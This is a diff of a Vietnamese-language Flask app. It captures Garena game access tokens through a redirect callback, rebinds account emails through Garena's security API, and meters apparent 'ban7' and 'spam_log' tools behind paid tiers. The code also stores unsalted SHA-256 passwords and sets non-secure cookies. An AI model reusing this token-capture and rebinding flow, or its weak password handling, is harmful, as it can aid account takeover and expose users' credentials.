             r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                              headers=GARENA_HEADERS,
                              data={'email': old_email, 'app_id': '100067', 
@@ -2609,8 +2580,6 @@ def change_bind_email():
         if not otp_new:
             return jsonify({'success': False, 'error': 'Vui lòng nhập mã OTP cho email mới'})
         
-        # Verify new OTP to get verifier_token
-        # NOTE: In Garena's flow, verify_otp on the NEW email returns a verifier_token
         r_otp = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_otp",
                         headers=GARENA_HEADERS,
                         data={'email': new_email, 'app_id': '100067', 
@@ -2621,7 +2590,6 @@ def change_bind_email():
         if not verifier_token:
             return jsonify({'success': False, 'error': f"Không lấy được mã xác minh: {r_otp.text}"})
         
-        # Create rebind request using BOTH tokens
         r_rebind = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
                         headers=GARENA_HEADERS,
                         data={'identity_token': identity_token, 'email': new_email, 
@@ -2635,7 +2603,6 @@ def change_bind_email():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# Authentication routes
 @app.route('/auth')
 def auth_page():
     return render_template('auth.html')
@@ -2648,22 +2615,19 @@ def register_page():
 def login():
     try:
         data = request.json
-        login_input = data.get('username')  # Could be username or email
+        login_input = data.get('username')
         password = data.get('password')
         remember_me = data.get('remember_me', False)
         
         if not login_input or not password:
             return jsonify({'success': False, 'error': 'Tên đăng nhập/email và mật khẩu là bắt buộc'})
         
-        # Hash the password
         hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
         
-        # Get users from Firebase
         users = firebase_get('/users')
         if not users:
             users = {}
         
-        # Find user by username or email
         user = None
         username = None
         for u_name, u_data in users.items():
@@ -2675,33 +2639,32 @@ def login():
         if not user:
             return jsonify({'success': False, 'error': 'Tên đăng nhập/email hoặc mật khẩu không đúng'})
         
-        # Check password
         if user.get('password') != hashed_password:
             return jsonify({'success': False, 'error': 'Tên đăng nhập/email hoặc mật khẩu không đúng'})
         
-        # Set session
+        # KIỂM TRA BỊ BAN
+        if user.get('is_banned', False):
+            return jsonify({
+                'success': False, 
+                'error': f'🚫 Tài khoản đã bị khóa!\nLý do: {user.get("ban_reason", "Vi phạm điều khoản")}',
+                'banned': True
+            })
+        
         session['username'] = username
         session['authenticated'] = True
         session['email'] = user.get('email')
         
-        # Create response
         response = jsonify({'success': True, 'message': 'Đăng nhập thành công'})
         
-        # Set remember me cookie
         if remember_me:
-            # Create a remember token
             remember_token = str(uuid.uuid4())
             expires = datetime.now() + timedelta(days=30)
-            
-            # Store remember token in Firebase
             users[username]['remember_token'] = remember_token
             firebase_update(f'/users/{username}', {'remember_token': remember_token})
-            
-            # Set cookie
             response.set_cookie('remember_token', remember_token, 
                              expires=expires, 
                              httponly=True, 
-                             secure=False,  # Set to True in production with HTTPS
+                             secure=False,
                              samesite='Lax')
         
         return response
@@ -2719,49 +2682,37 @@ def register():
         if not all([username, email, password]):
             return jsonify({'success': False, 'error': 'Tất cả các trường đều bắt buộc'})
         
-        # Validate username length
         if len(username) < 3 or len(username) > 20:
             return jsonify({'success': False, 'error': 'Tên đăng nhập phải từ 3 đến 20 ký tự'})
         
-        # Validate email format
         email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
         if not re.match(email_pattern, email):
             return jsonify({'success': False, 'error': 'Email không hợp lệ'})
         
-        # Validate password length
         if len(password) < 6:
             return jsonify({'success': False, 'error': 'Mật khẩu phải có ít nhất 6 ký tự'})
         
-        # Get users from Firebase
         users = firebase_get('/users')
         if not users:
             users = {}
         
-        # Check if username already exists
         if username in users:
             return jsonify({'success': False, 'error': 'Tên đăng nhập đã tồn tại'})
         
-        # Check if email already exists
         for user_data in users.values():
             if user_data.get('email') == email:
                 return jsonify({'success': False, 'error': 'Email đã được sử dụng'})
         
-        # Hash password
         hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()
-        
-        # Create user in Firebase
         user_data = {
             'username': username,
             'email': email,
             'password': hashed_password,
             'created_at': datetime.now().isoformat(),
-            'is_pro': False
+            'is_pro': False,
+            'is_banned': False
         }
-        
-        # Save user to Firebase
         firebase_set(f'/users/{username}', user_data)
-        
-        # Initialize usage
         usage_data = {
             'ban7': 0,
             'spam_log': 0,
@@ -2776,21 +2727,36 @@ def register():
 @app.route('/api/check_auth', methods=['GET'])
 def check_auth():
     try:
-        # Check session
         if session.get('authenticated') and session.get('username'):
             username = session.get('username')
-            usage = firebase_get(f'/usage/{username}')
             user = firebase_get(f'/users/{username}')
+            
+            # Kiểm tra tài khoản bị ban
+            if user and user.get('is_banned', False):
+                session.clear()
+                response = jsonify({
+                    'authenticated': False,
+                    'banned': True,
+                    'reason': user.get('ban_reason', 'Tài khoản đã bị khóa')
+                })
+                response.set_cookie('remember_token', '', expires=0)
+                return response
+            
+            usage = firebase_get(f'/usage/{username}')
             if not usage:
                 usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
 
-            # Add tool-specific pro status
             usage['ban7_pro'] = check_tool_pro(username, 'ban7')
             usage['spam_log_pro'] = check_tool_pro(username, 'spam_log')
+            usage['is_banned'] = user.get('is_banned', False) if user else False
 
-            return jsonify({'authenticated': True, 'username': username, 'email': user.get('email') if user else '', 'usage': usage})
+            return jsonify({
+                'authenticated': True,
+                'username': username,
+                'email': user.get('email') if user else '',
+                'usage': usage
+            })
 
-        # Check remember me cookie
         remember_token = request.cookies.get('remember_token')
         if remember_token:
             users = firebase_get('/users')
@@ -2798,6 +2764,16 @@ def check_auth():
                 users = {}
             for username, user_data in users.items():
                 if user_data.get('remember_token') == remember_token:
+                    # Kiểm tra bị ban
+                    if user_data.get('is_banned', False):
+                        response = jsonify({
+                            'authenticated': False,
+                            'banned': True,
+                            'reason': user_data.get('ban_reason', 'Tài khoản đã bị khóa')
+                        })
+                        response.set_cookie('remember_token', '', expires=0)
+                        return response
+                    
                     session['username'] = username
                     session['authenticated'] = True
                     session['email'] = user_data.get('email')
@@ -2805,11 +2781,16 @@ def check_auth():
                     if not usage:
                         usage = {'ban7': 0, 'spam_log': 0, 'is_pro': False}
 
-                    # Add tool-specific pro status
                     usage['ban7_pro'] = check_tool_pro(username, 'ban7')
                     usage['spam_log_pro'] = check_tool_pro(username, 'spam_log')
+                    usage['is_banned'] = user_data.get('is_banned', False)
 
-                    return jsonify({'authenticated': True, 'username': username, 'email': user_data.get('email'), 'usage': usage})
+                    return jsonify({
+                        'authenticated': True,
+                        'username': username,
+                        'email': user_data.get('email'),
+                        'usage': usage
+                    })
         
         return jsonify({'authenticated': False})
     except Exception as e:
@@ -2820,14 +2801,11 @@ def logout():
     try:
         username = session.get('username')
         
-        # Clear remember token from Firebase
         if username:
             firebase_update(f'/users/{username}', {'remember_token': None})
         
-        # Clear session
         session.clear()
         
-        # Create response and clear cookie
         response = jsonify({'success': True, 'message': 'Đăng xuất thành công'})
         response.set_cookie('remember_token', '', expires=0)
         
@@ -2835,11 +2813,8 @@ def logout():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# --- Automated Token Capture ---
-
 @app.route('/api/garena_callback')
 def garena_callback():
-    """Endpoint to receive token from Garena/Kiosgamer redirect"""
     eat = request.args.get('eat')
     state = request.args.get('state')
     account_id = request.args.get('account_id')
@@ -2854,7 +2829,6 @@ def garena_callback():
         """, 400
         
     try:
-        # Save to Firebase temp storage
         capture_data = {
             'eat': eat,
             'account_id': account_id,
@@ -2886,17 +2860,13 @@ def garena_callback():
 
 @app.route('/api/check_token_capture')
 def check_token_capture():
-    """Endpoint for frontend to poll for captured token"""
     state = request.args.get('state')
     if not state:
         return jsonify({'success': False, 'error': 'Missing state'})
         
     try:
-        # Try to get from Firebase
         data = firebase_get(f'/temp_tokens/{state}')
         if data:
-            # Delete after retrieval to keep it clean (optional)
-            # firebase_set(f'/temp_tokens/{state}', None)
             return jsonify({'success': True, 'data': data})
         else:
             return jsonify({'success': False, 'status': 'waiting'})
